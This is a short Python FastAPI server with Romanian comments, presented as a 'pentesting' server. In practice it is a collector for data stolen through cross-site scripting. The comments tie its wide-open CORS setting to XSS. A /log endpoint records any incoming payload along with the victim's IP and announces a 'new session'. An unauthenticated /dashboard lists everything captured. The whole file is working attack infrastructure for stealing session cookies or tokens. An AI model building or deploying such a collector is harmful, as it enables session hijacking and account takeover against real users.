from fastapi import FastAPI, Request
from fastapi.middleware.cors import CORSMiddleware
import datetime

app = FastAPI()

# Permitem primirea datelor de pe orice site (important pentru XSS)
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_methods=["*"],
    allow_headers=["*"],
)

sessions_db = []

@app.get("/")
def home():
    return {"status": "Serverul de Pentesting este ACTIV"}

@app.get("/log")
async def collect(data: str, request: Request):
    entry = {
        "id": len(sessions_db) + 1,
        "timestamp": datetime.datetime.now().strftime("%H:%M:%S"),
        "ip": request.client.host,
        "payload": data
    }
    sessions_db.append(entry)
    print(f"!!! SESIUNE NOUA DE LA {entry['ip']} !!!")
    return {"status": "ok"}

@app.get("/dashboard")
def get_sessions():
    return sessions_db